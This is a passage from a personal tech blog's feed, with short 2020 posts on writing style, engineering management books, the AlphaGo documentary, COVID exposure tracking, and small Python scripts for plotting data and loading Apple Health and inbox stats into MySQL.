<p>As an example, rather than prepending “said” with yet another adverb instead think of verbs that get your point across better - maybe it’s shouted, or exclaimed, or charged, or yelled, or accused, or hundreds others. Each of them carry more weight than just decorating said. Not to mention this is a great way to expand your vocabulary!</p>

<p>I’m not sure why this thought popped into my mind but it resonated and something I’ll endeavour to prioritize in my writing. I value expressiveness and love cutting cruft - this is a simple way to do it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The curse of mastery</title>
   <link href="http://dangoldin.com/2020/05/16/the-curse-of-mastery/"/>
   <updated>2020-05-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/16/the-curse-of-mastery</id>
   <content:encoded><![CDATA[
<p>One of the most valuable skills a software engineer can have is a “<a href="https://en.wikipedia.org/wiki/Tabula_rasa">tabula rasa</a>” mindset. Tabula rasa, Latin for blank slate, is a philosophical concept dating back to Aristotle to explain how human minds are blank from the beginning and acquire knowledge through the human experience.</p>

<p>I think of it as being able to approach new challenges and experiences with no prior bias. Done well, this is an incredible power since you’re able to cut through the complexity and focus on what actually matters. Imagine you’re a software engineer who joins a new company - there’s so much business context you need to ramp up in addition to the code that’s grown in complexity over the years. By the time you’ve mastered everything it all makes sense and you’ve embraced the complexity.</p>

<p>There’s a well known story about a monkey experiment where a group of monkeys is taught to avoid reaching for a banana by being sprayed with ice-cold water. Over time they replace one monkey at a time - at each stage that new monkey goes for the banana and is then beat by the other monkeys until it learns to avoid going for the banana. At some point, there are none of the original monkeys left yet they continue to avoid the banana despite no longer knowing the original reason - and beat up any monkey that tries. Unfortunately, as nice as this sounds it’s <a href="https://www.psychologytoday.com/us/blog/games-primates-play/201203/what-monkeys-can-teach-us-about-human-behavior-facts-fiction">apocryphal</a> and yet we can all learn from these imagined monkeys.</p>

<p>The ability to constantly approach things from the perspective of “what if we were starting from scratch” is rare and becomes more and more difficult as we gain expertise. Our strength is in our ability to quickly pattern match but it becomes a curse when we would benefit in starting from first principles. The way to make this stick is to constantly ask yourself that question until it becomes second nature and you start doing it naturally.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Limits of our imagination</title>
   <link href="http://dangoldin.com/2020/05/16/limits-of-our-imagination/"/>
   <updated>2020-05-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/16/limits-of-our-imagination</id>
   <content:encoded><![CDATA[
<p>While listening to a <a href="https://a16z.com/2020/04/29/the-chief-security-officer-in-and-out-of-a-crisis/">podcast</a> describing the CSO role there was an interesting anecdote mentioned (~14:19 mark) that I couldn’t find anywhere else: in the 1900s the chief electrician on wall street was one of the highest paid positions. Back then, the electricity infrastructure was not as stable as it is now and it was not a certainty that it would stay up so those dedicated to keeping the systems running were appropriately rewarded. Over time, the electrical infrastructure became stable enough that it’s become expected and very few worry about it.</p>

<p>For what roles is this true for now but won’t be in a 100 years? The world has changed significantly over the past century and it’s only accelerating and yet we can imagine what’s currently bleeding edge will become normalized over time. The example that comes to mind is AI and ML - we’re making incredible progress and yet it comes with a variety of warts that requires know-how and experience to operate. At the same time, once artificial general intelligence comes around it will be feeding itself and seem like a black box to most, if not everyone.</p>

<p>The more difficult question is what will be the most vital roles a century from now? If you were to ask someone this question a 100 years ago there’s no way they’d be able to predict the professions we have now despite their science fiction. If you read a modern science fiction book it all seems inevitable and somewhat obvious and yet what are we missing? Is our imagination that limited?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Sometimes it really is just the dirty, hard work</title>
   <link href="http://dangoldin.com/2020/05/02/sometimes-it-really-is-just-the-dirty-hard-work/"/>
   <updated>2020-05-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/02/sometimes-it-really-is-just-the-dirty-hard-work</id>
   <content:encoded><![CDATA[
<p>It’s easy to fall into the trap of only wanting to do the new and sexy thing and giving up as soon as something requires the dirty work. That’s rarely a strategy for success and jumping from one idea to another idea and only focusing on the interesting parts is a sure fire way to not get anything done.</p>

<p>Last week I had a brief conversation with Twitter that got me looking for Apple’s S-1. Apple filed this in 1980 as part of their IPO process and on one hand it’s remarkable that you can find a <a href="https://www.sec.gov/files/18-02062-FOIA.pdf">40 year old document online</a> and yet on the other hand it’s disappointing that it came as a PDF. I imagine every year there are thousands (tens of thousands?) of people that want to take a look at the IPO docs of one of the most impressive tech companies and yet end up with a poorly rendered version. What if someone took the time to modernize it and convert it to a modern S-1? A massive amount of people would benefit and they would get the credit.</p>

<p>I tried searching for a non-PDF version and wasn’t able to find one. Why not? It’s incredibly menial work. There are tools that do a light conversion but you’d spend dozens of hours polishing and making sure the non-textual data was properly converted.</p>

<p>Does this mean that I’m going to convert Apple’s S-1 from a PDF to HTML? No. I understand the hypocrisy but who has the time?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Data analysis and visualization</title>
   <link href="http://dangoldin.com/2020/04/29/data-analysis-and-visualization/"/>
   <updated>2020-04-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/29/data-analysis-and-visualization</id>
   <content:encoded><![CDATA[
<p>Yesterday I had the rare chance to actually do some coding and realized how rusty I am at numerical analysis in Python. The task was simple - ingest a CSV that had a date column, two categorical columns, and a numerical column - and then generate a grid containing a series of line plots, each of which would be a combination of the two categorical columns.</p>

<p>I did a ton of this work years ago so knew what was possible. That’s half the battle and after a bit of searches I got a working solution. At the same time I’m disappointed it took me that long, especially after seeing the brevity of the end result. Software ate the world and now every business is generating tons of data. Being able to make sense of it is an increasingly important skill set especially if you’re a leader. It’s unfortunately an area I haven’t kept up with over the years and something I plan on remedying after this experience.</p>

<p>I also couldn’t help but be inspired by <a href="https://rt.live/">rt.live</a>, if the founders of Instagram have both the skillset and the inclination to do data work it’s a good indicator that there’s something there.</p>

<img src="http://dangoldin.com/assets/static/images/sample-weekly-dim1-dim2.png" alt="Example screenshot of the grid plot" width="6000" height="6000" layout="responsive"/>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="n">pd</span>
<span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="n">plt</span>

<span class="n">plt</span><span class="p">.</span><span class="n">rcParams</span><span class="p">.</span><span class="n">update</span><span class="p">({</span><span class="s">'font.size'</span><span class="p">:</span> <span class="mi">6</span><span class="p">})</span>
<span class="n">plt</span><span class="p">.</span><span class="n">rcParams</span><span class="p">.</span><span class="n">update</span><span class="p">({</span><span class="s">'figure.figsize'</span><span class="p">:</span> <span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">30</span><span class="p">)})</span>

<span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="n">read_csv</span><span class="p">(</span><span class="s">'weekly-dim1-dim2.txt'</span><span class="p">)</span>

<span class="c1"># Fix up dates
</span><span class="n">df2</span><span class="p">[</span><span class="s">'week_dt'</span><span class="p">]</span> <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="n">to_datetime</span><span class="p">(</span><span class="n">df2</span><span class="p">[</span><span class="s">'week'</span><span class="p">],</span> <span class="nb">format</span><span class="o">=</span><span class="s">'%Y-%m-%d'</span><span class="p">)</span>
<span class="n">df2</span> <span class="o">=</span> <span class="n">df2</span><span class="p">.</span><span class="n">sort_values</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="p">[</span><span class="s">'week_dt'</span><span class="p">])</span>

<span class="c1"># Get unique vals
</span><span class="n">dim1</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">df2</span><span class="p">[</span><span class="s">'dim1'</span><span class="p">].</span><span class="n">unique</span><span class="p">()))</span>
<span class="n">dim2</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">df2</span><span class="p">[</span><span class="s">'dim2'</span><span class="p">].</span><span class="n">unique</span><span class="p">()))</span>

<span class="n">plt</span><span class="p">.</span><span class="n">tight_layout</span><span class="p">()</span>
<span class="n">fig</span><span class="p">,</span> <span class="n">axes</span> <span class="o">=</span> <span class="n">plt</span><span class="p">.</span><span class="n">subplots</span><span class="p">(</span><span class="n">nrows</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">d1</span><span class="p">),</span> <span class="n">ncols</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">d2</span><span class="p">))</span>

<span class="c1"># Generate plots per dim1 and dim2 combination subject to data and threshold
</span><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">d1</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">d1</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span><span class="p">,</span> <span class="n">d2</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">d2</span><span class="p">):</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">df2</span><span class="p">[(</span><span class="n">df2</span><span class="p">[</span><span class="s">'dim1'</span><span class="p">]</span><span class="o">==</span><span class="n">d1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">df2</span><span class="p">[</span><span class="s">'dim2'</span><span class="p">]</span><span class="o">==</span><span class="n">d2</span><span class="p">)]</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">index</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">x</span><span class="p">.</span><span class="n">set_index</span><span class="p">([</span><span class="s">'week_dt'</span><span class="p">])[</span><span class="s">'num'</span><span class="p">].</span><span class="n">plot</span><span class="p">(</span><span class="n">ax</span><span class="o">=</span><span class="n">axes</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">])</span>
            <span class="n">axes</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">].</span><span class="n">set_title</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">d1</span><span class="p">)</span> <span class="o">+</span> <span class="s">'-'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">d2</span><span class="p">))</span>

<span class="n">plt</span><span class="p">.</span><span class="n">tight_layout</span><span class="p">(</span><span class="n">pad</span><span class="o">=</span><span class="mf">0.4</span><span class="p">,</span> <span class="n">w_pad</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">h_pad</span><span class="o">=</span><span class="mf">1.0</span><span class="p">)</span>
<span class="n">plt</span><span class="p">.</span><span class="n">savefig</span><span class="p">(</span><span class="s">'out.png'</span><span class="p">,</span> <span class="n">dpi</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Engineering management resources</title>
   <link href="http://dangoldin.com/2020/04/25/engineering-management-resources/"/>
   <updated>2020-04-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/25/engineering-management-resources</id>
   <content:encoded><![CDATA[
<p>At the beginning of the year I gave myself a goal to write more management posts. We’re nearly 5 months into the year and I’ve written only two posts even relating to management. A big reason is impostor syndrome - while I have only been managing a few years there are so many others that have more experience, are better managers, and are more effective writers. At the same time, the lack of experience hasn’t really stopped me from writing on other topics though so why should this be any different? This coupled with the fact that I write to organize my thoughts and clarify my thinking is all the more reason to commit to writing about new topics. As a start, I thought it would be helpful to share some resources that have helped me grow as a manager.</p>

<p><strong>Books</strong></p>

<p>There’s a bit of a recency bias here since I haven’t kept the best track of all the books I’ve read but I’ll keep adding as I become more organized.</p>

<ul>
  <li><strong><a href="https://www.amazon.com/Managers-Path-Leaders-Navigating-Growth-ebook/dp/B06XP3GJ7F/">The Manager’s Path</a></strong> (Camille Fournie). Rather than focusing on a specific level this book covers the various engineering leadership roles - ranging from being a mentor to being a CEO.</li>
  <li><strong><a href="https://www.amazon.com/Making-Manager-What-Everyone-Looks/dp/0735219567">The Making of a Manager</a></strong> (Julie Zhou). The aim here is to give new managers a framework to think about management through a variety of personal anecdotes.</li>
  <li><strong><a href="https://www.amazon.com/Trillion-Dollar-Coach-Leadership-Playbook/dp/B07MVKGV9V/">Trillion Dollar Coach</a></strong> (Eric Schmidt, Jonathan Rosenberg, Alan Eagle). This is not a typical engineering management book but covers a variety of lessons that Bill Campbell, the legendary angel investor, shared over his mentorship career.</li>
  <li><strong><a href="https://www.amazon.com/Elegant-Puzzle-Systems-Engineering-Management-ebook/dp/B07QYCHJ7V">An Elegant Puzzle</a></strong> (Will Larsen). Oftentimes books avoid giving advice in order to avoid being too black and white but that’s not the case here. Similar to The Making of a Manager, this is based on personal anecdotes and has advice covering a variety of areas.</li>
  <li><strong><a href="https://www.amazon.com/Hard-Thing-About-Things-Building/dp/0062273205">The Hard Thing about Hard Things</a></strong> (Ben Horowitz). This reads like a series of personal anecdotes that each come with a lesson. There’s no unifying theme here but the advice itself feels more raw than the other books on this list.</li>
  <li><strong><a href="https://leadingsnowflakes.com/">Leading Snowflakes</a></strong> (Oren Ellenbogen). This was the first book I read as a manager and remember it doing a great job giving prescriptive advice to the new manager with concrete exercises and “homework” to do.</li>
  <li><strong><a href="https://www.amazon.com/High-Output-Management-Andrew-Grove/dp/0679762884">High Output Management</a></strong> (Andy Grove). Impossible to include a management book list and not have this classic on here. High Output Management is less about engineering management and more about the role of management, the ways to drive leverage, and a bit of practical advice.</li>
</ul>

<p><strong>Newsletters</strong></p>
<ul>
  <li><strong><a href="https://firstround.com/review/">First Round Review</a></strong>. This is a series geared towards entrepreneurs where each article highlights an industry leader with a particular lesson to share. It’s rare that an article isn’t valuable and I strongly encourage everyone to subscribe.</li>
  <li><strong><a href="https://softwareleadweekly.com/">Software Lead Weekly</a></strong>. This is a weekly newsletter for software engineering leaders (thus the name) and provides a list of recommended reads along with a quick blurb. Some of the topics are about technology but the majority are about the people side of engineering management.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Margin of victory</title>
   <link href="http://dangoldin.com/2020/04/24/margin-of-victory/"/>
   <updated>2020-04-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/24/margin-of-victory</id>
   <content:encoded><![CDATA[
<p>During the <a href="https://www.youtube.com/watch?v=WXuK6gekU1Y">AlphaGo documentary</a> there’s a scene where the AI makes a very conservative move that the commentary notes is very different from what a human would do. The explanation is that AlphaGo doesn’t care about the margin of victory, just the victory itself. It’s trying to maximize the likelihood of winning, not the score differential - and that leads to a unique playing style.</p>

<p>I found this part of the documentary fascinating as it’s one of those things that’s obvious when explained but you’d never stop to think about. Humans rarely think about margin of victory. Most of our decisions and competitions aren’t quantifiable so we always try to do the best we can. In sports, on the other hand, where there are actual scores, teams will play for the victory rather than the score. It’s interesting to think of decisions in our daily lives that would benefit from shifting from margin-of-victory thinking to the victory itself. It’s not natural and being able to challenge human nature is a valuable skill.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Optimizing code? Think theoretical limits</title>
   <link href="http://dangoldin.com/2020/04/18/optimizing-code-think-theoretical-limits/"/>
   <updated>2020-04-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/18/optimizing-code-think-theoretical-limits</id>
   <content:encoded><![CDATA[
<p>This post was inspired from a conversation with an engineer who was tasked with optimizing the performance of a heavily used static JavaScript script. This code gets loaded billions of times a day across a variety of devices and small improvements to its load time and performance can drive significant value to our customers and us.</p>

<p>When you start it’s easy to find the low hanging fruit and get the simple wins. But as you keep working on the same problem these wins become rarer and rarer and oftentimes a win in one area may be a loss in another. Using our static JavaScript code as an example we can argue that we should split it into multiple, smaller files and load them on demand. That would make the total amount of code loaded and executed lower but, on the other hand, would increase the number of network requests. And if you then layer in caching and the variety of devices it will run on it’s not at all obvious what the impact of a change will be.</p>

<p>In these cases it’s helpful to think about the theoretical limits. This lets you identify where the opportunities actually are. Paraphrasing <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl’s Law</a> - there’s no point in optimizing the areas that are responsible for only a small fraction of the total execution time. Even if you make them instant they will still be drowned out by everything else.</p>

<p>The theoretical limits are only a starting point. Our systems are so complex with so many moving pieces that it’s imperative to actually test the performance in the real world. The example above highlights how many different pieces there are when optimizing a static bit of JavaScript - only a small part is the actual code and the rest is driven by our customers’ environments and network. A web app with a core set of users may be optimized by having a single giant file. On the other hand, if your code is executed once for the average user you’ll likely be better off minimizing the file as much as possible and only loading the parts that are necessary. Our intuition only gets us this far and to truly optimize our code we need to see it run in the real world.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google and Apple's COVID tracking project</title>
   <link href="http://dangoldin.com/2020/04/18/google-and-apples-covid-tracking-project/"/>
   <updated>2020-04-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/18/google-and-apples-covid-tracking-project</id>
   <content:encoded><![CDATA[
<p>Google and Apple recently announced a partnership to help people anonymously see if they’ve been exposed to someone with COVID. The idea itself is elegant and does a nice job balancing the functionality with the need for privacy. One of the most common takes I’ve seen in tech circles is that no one will use it due to a concern for privacy.</p>

<p>I think the opposite. I believe that with enough marketing this will be a massive success. Over and over again we’ve seen that most people do not value privacy and this will be no different. In fact, for this case it may just be the opposite - most people would love to know the answer to “is there a chance I have Coronavirus.” Curiosity, one of our greatest traits, will be enough to overcome whatever privacy concerns people have.</p>

<p>This is all predicated on some marketing campaign to raise awareness but something as simple as the pitch “find out if you’ve been exposed to Coronavirus by simply using your phone” would be incredibly effective. These days both Google and Apple have higher credibility than the government and the fact that this is led by two well respected private companies may actually be a benefit in the current political climate.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AlphaGo documentary</title>
   <link href="http://dangoldin.com/2020/04/18/alphago-documentary/"/>
   <updated>2020-04-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/18/alphago-documentary</id>
   <content:encoded><![CDATA[
<amp-youtube data-videoid="WXuK6gekU1Y" layout="responsive" width="1280" height="720"></amp-youtube>

<p><strong>Spoiler</strong>: If you haven’t seen the documentary and want to avoid any spoilers don’t read the post. At the same time you should watch it - it’s an incredible film.</p>

<p>I watched the AlphaGo documentary and it left a powerful impression on me.</p>

<p>The accomplishment by the AlphaGo team is incredible. At the same time I felt incredibly sad watching it and became slightly depressed. It felt very much like a man vs machine battle yet the machine was a huge team of engineers with nearly unlimited resources. You know that it’s inevitable that the machine wins and yet the way the documentary was done made it seem less of a highlight of the great work by the team and instead a defeat of a single person.</p>

<p>The highlight was Lee Sedol’s win in Game 4 due to a move that AlphaGo attributed a tiny probability to and wasn’t able to react. At the same time, that underscores how outmatched Lee was - on one hand it was human genius and intuition that made the move on the other hand it felt like a flash in the pan based on AlphaGo’s dominance in the other games.</p>

<p>I thought back to when I was a kid where we were able to have dreams at being the “best in the world at X”, where X could be any intellectual game. These days if you’re a kid the best you could hope for is to be “the best human at X” and that’s disappointing. Expected but disappointing.</p>

<p>Maybe I’m a romantic but I can’t help but think that something gets lost every time there’s another AI or ML victory. I’m an optimist and know technology will change society and yet there is a cost to this progress. It may be a small price to pay but it’s also a point of no return.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dumping Apple health data into MySQL</title>
   <link href="http://dangoldin.com/2020/04/11/dumping-apple-health-data-into-mysql/"/>
   <updated>2020-04-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/11/dumping-apple-health-data-into-mysql</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/grafana-health-stats.png" alt="Grafana visualization of my Apple health stat" width="1860" height="944" layout="responsive"/>

<p>I apparently can’t get enough of Grafana and the latest quantified self push was to visualize the data from Apple health. Apple makes it pretty simple to export the data but it’s in XML so there’s a small bit of processing to turn into something that can be visualized. For my personal stats I’m dumping the data to MySQL and writing fairly simple queries to visualize them. Since I already did a similar export in my <a href="https://github.com/dangoldin/email-stats">email-stats</a> code I was able to reuse a fair amount. The major difference was that the Apple health export is fairly large (my export for 2020 was an 80 MB file) and it would be a shame to not apply a few optimizations.</p>

<p>In this case, I ended up doing two somewhat interesting things. One was to prevent duplicate information by making the code support some “since” logic which required the usual timezone wrangling that no one is able to escape. The other was adopting a streaming approach to both the iteration and filtration of the XML doc and the MySQL write. This ended up a pretty neat problem that showed off the power of Python’s generator since I was able to pass in the generator function itself into the database write method and then found a neat method that allowed me to fetch batches of data from the generator.</p>

<p>As usual, the code is up on <a href="https://github.com/dangoldin/health-stats">GitHub</a> but I’ve included the notable pieces below.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># From https://docs.python.org/3/library/itertools.html#recipes
</span><span class="k">def</span> <span class="nf">grouper</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">iterable</span><span class="p">,</span> <span class="n">fillvalue</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="nb">iter</span><span class="p">(</span><span class="n">iterable</span><span class="p">)]</span> <span class="o">*</span> <span class="n">n</span>
    <span class="k">return</span> <span class="n">zip_longest</span><span class="p">(</span><span class="n">fillvalue</span><span class="o">=</span><span class="n">fillvalue</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">read_records</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">datetime_to_start</span> <span class="o">=</span> <span class="bp">None</span><span class="p">):</span>
    <span class="p">...</span>
    <span class="k">yield</span> <span class="n">Record</span><span class="p">(</span><span class="n">TYPE_MAP</span><span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="n">attributes</span><span class="p">[</span><span class="s">'type'</span><span class="p">].</span><span class="n">value</span><span class="p">],</span> <span class="n">dt</span><span class="p">.</span><span class="n">astimezone</span><span class="p">(</span><span class="n">pytz</span><span class="p">.</span><span class="n">UTC</span><span class="p">),</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">save_records</span><span class="p">(</span><span class="n">creds</span><span class="p">,</span> <span class="n">record_generator</span><span class="p">):</span>
    <span class="p">...</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="s">"INSERT INTO health_stats (type, datetime, value) VALUES (%s, %s, %s)"</span>
    <span class="k">for</span> <span class="n">batch</span> <span class="ow">in</span> <span class="n">grouper</span><span class="p">(</span><span class="n">BATCH_SIZE</span><span class="p">,</span> <span class="n">record_generator</span><span class="p">):</span>
        <span class="n">vals</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">record</span> <span class="ow">in</span> <span class="n">batch</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">record</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">vals</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">record</span><span class="p">.</span><span class="nb">type</span><span class="p">,</span> <span class="n">record</span><span class="p">.</span><span class="n">datetime</span><span class="p">,</span> <span class="n">record</span><span class="p">.</span><span class="n">value</span><span class="p">))</span>
        <span class="n">mycursor</span><span class="p">.</span><span class="n">executemany</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">vals</span><span class="p">)</span>

<span class="p">...</span>

<span class="n">save_records</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">'db'</span><span class="p">],</span> <span class="n">read_records</span><span class="p">(</span><span class="s">'export.xml'</span><span class="p">,</span> <span class="n">datetime_to_start</span><span class="p">))</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Gamification works</title>
   <link href="http://dangoldin.com/2020/04/07/gamification-works/"/>
   <updated>2020-04-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/07/gamification-works</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/grafana-emails-avg-age.png" alt="Grafana dashboard for emails in inbox and the avg age" width="1840" height="943" layout="responsive"/>

<p>Gamification works. Last week I hacked together a Grafana dashboard to measure the number of emails in my inbox and sure enough this gave me enough motivation to actually go through them. Earlier this week I added another metric to track the average age of an email and sure enough that caused me to go through the 4 and 5 year old emails.</p>

<p>It’s quite amazing how the human mind (or at least mine) works. I’ve known for years that I have some very old emails floating around and I also know that I have too many emails in my inbox and yet having it visualized motivated me to actually do something. It’s difficult to be introspective but I suspect the biggest factor was the quick feedback loop and knowing that by spending a bit of time I can quickly see the impact on the metrics.</p>

<p>The lesson here is to measure everything you want to improve, visualize it, and make looking at them a daily habit. Your human psychology will take over and you’ll start optimizing against those goals.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Start open sourcing government software</title>
   <link href="http://dangoldin.com/2020/04/05/start-open-sourcing-government-software/"/>
   <updated>2020-04-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/05/start-open-sourcing-government-software</id>
   <content:encoded><![CDATA[
<p>Two years ago I <a href="/2017/09/22/open-sourcing-government/">wrote a post</a> describing an open source model for developing government software. The driver then was improving the user experience of government services and making them more approachable but the news this week makes this much more than a nicer UX. The state of NJ is apparently <a href="https://www.youtube.com/watch?v=HSVgHlSTPYQ">looking for COBOL programmers</a> in order to update the unemployment system to handle the unprecedented volume. It’s easy to make a government joke but there are real people that are unable to get the services they need. This particular problem will be solved but another one will pop up in its place.</p>

<p>I’m a techno-optimist but I do believe there are enough software engineers out there who would love to give back to their country. Imagine if this unemployment program was open sourced and the world’s engineers had access to it. Some may spend time digging into the code to document the rules. Others would work on generating test data. Many others would try to rewrite it in their own language of choice. I like to think that together they’d be able to revamp it for the modern era.</p>

<p>Governments would still require software engineers to handle the proprietary data, the infrastructure, and the release process but much of the remaining work would be able to be outsourced to the community. If this was done at the local and state level then we’d also have a variety of implementations for similar problems which would engender an arms race to improve the local version.</p>

<p>As I mentioned in the previous post there’s a lot to consider with this model but there’s no reason to at least try it on something low risk. Maybe it’s something as simple as open sourcing a static, low risk site, learning from it, and then expanding to others.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Finding the truth in a sea of misinformation</title>
   <link href="http://dangoldin.com/2020/04/04/finding-the-truth-in-a-sea-of-misinformation/"/>
   <updated>2020-04-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/04/04/finding-the-truth-in-a-sea-of-misinformation</id>
   <content:encoded><![CDATA[
<p>Two days ago I read an <a href="https://stratechery.com/2020/an-interview-with-zeynep-tufekci-about-masks-media-and-information-ecology/">interview</a> between Ben Thompson and Zeynep Tufekci which highlighted the current state of information (and misinformation). That same day I came across an <a href="https://marker.medium.com/what-everyones-getting-wrong-about-the-toilet-paper-shortage-c812e1358fe0">article</a> by <a href="https://twitter.com/WillOremus">Will Remus</a> on the cause of the toilet paper shortage (spoiler: it has to do with differences between the corporate and personal toilet paper supply chains). Both of these highlight how little I actually know and how valuable skeptical mindset is these days. I still don’t know the truth and it’s likely something that changes constantly but being able to separate fact from fiction is a massive advantage. The obvious example is knowing how serious COVID-19 would be and preparing for it in January. The challenges and opportunities will only get larger as the amount of information (majority of which will be misinformation) being produced increases. The ability to be objective, dig into the sources, and understand biases is going to be a critical skill in the upcoming century.</p>

<p>Older generations grew up trusting TV News and still have the same bias. Modern kids, on the other hand, realize that there’s a ton of disinformation out there and know not to trust everything they see or read. Those of us in the middle need to learn from the kids and learn to navigate this information overload.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing my journey to Inbox Zero</title>
   <link href="http://dangoldin.com/2020/03/31/visualizing-my-journey-to-inbox-zero/"/>
   <updated>2020-03-31T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/03/31/visualizing-my-journey-to-inbox-zero</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/grafana-emails-in-inbox.png" alt="Number of emails in my inbox by account" width="1855" height="518" layout="responsive"/>

<p>I subscribe to the “Inbox Zero” philosophy and treat my email inbox as a todo list that I slowly work through. As part of the desire to get more and more quantitative I wrote a quick script to pull the number of emails from my Inbox and then insert the data as a row into a new table in my personal stats database. As usual, most of the work was in deciding to do it and once I got to coding the hacky solution was done within 20 minutes. The script uses Python’s built-in <a href="https://docs.python.org/3/library/imaplib.html">imaplib</a> library to log in to an email provider and then a simple MySQL query to insert the resulting data. I hooked this up to run every 15 minutes via cron and put together a Grafana dashboard to plot the count over time. I’m currently not actually going through the content of the email messages themselves but there are tons of directions I can take this - for example slicing the data by sender or examining the age of the messages. For now I’m just hopeful this motivates me to keep going through that email.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#! /usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">imaplib</span>
<span class="kn">import</span> <span class="nn">mysql.connector</span>

<span class="c1"># TODO: Handle credentials better (environment, config, etc)
</span><span class="n">IMAP_INFO</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'work'</span><span class="p">:</span> <span class="p">{</span>
        <span class="s">'imap_host'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
        <span class="s">'imap_port'</span><span class="p">:</span> <span class="mi">993</span><span class="p">,</span>
        <span class="s">'imap_user'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
        <span class="s">'imap_pass'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="s">'personal'</span><span class="p">:</span> <span class="p">{</span>
        <span class="s">'imap_host'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
        <span class="s">'imap_port'</span><span class="p">:</span> <span class="mi">993</span><span class="p">,</span>
        <span class="s">'imap_user'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
        <span class="s">'imap_pass'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
    <span class="p">},</span>
<span class="p">}</span>

